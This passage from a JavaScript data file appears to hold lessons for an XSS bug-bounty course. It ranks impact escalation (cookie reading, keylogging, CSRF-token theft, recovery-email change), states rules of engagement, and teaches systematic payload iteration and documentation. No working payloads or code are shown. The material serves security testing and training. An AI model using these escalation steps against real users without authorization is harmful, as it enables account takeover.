        'Impact options in order of severity: read what the page can read (non-Httponly cookies, page content), act as the victim (authenticated actions), capture input (keylogger), chain to account takeover (steal CSRF tokens, change recovery email).',
        'Rules of engagement: your authorization defines the ceiling. No destructive actions, no real users, no persistence, minimum data. If a program says proof of alert(1) is enough, STOP there.',
        'Document as you go: exact request, response, impact, and the minimal fix you would recommend.'
      ],
      lesson: 'A finding is a story: input, sink, execution, impact. The better the story, the better the bounty. Random payloads with no narrative get closed as informative.'
    },
    {
      id: 'm7', title: 'Adapt, document, move on', icon: 'refresh',
      goal: 'Systematic iteration instead of payload roulette, and knowing when a target is done.',
      items: [
        'When blocked: change exactly ONE variable (encoding, tag, event, context) and observe. Keep a table of attempts: what you sent, what came back, what you learned.',
        'Dead ends are data: "this reflection is fully encoded" is a fact you reuse when you find the same value rendered elsewhere.',
        'Timebox: if a surface resists every systematic variation, log it and move to the next surface. Professionals are not the ones who never quit; they are the ones who quit at the right time and document why.',
        'Your notes ARE your career: the writeup is the product.'
      ],
      lesson: 'The methodology is the skill. Payload lists rot; understanding compounds.'
    }
  ];

  return { CONTEXTS, TOKENS, DIAGNOSTICS, METHOD };
})();
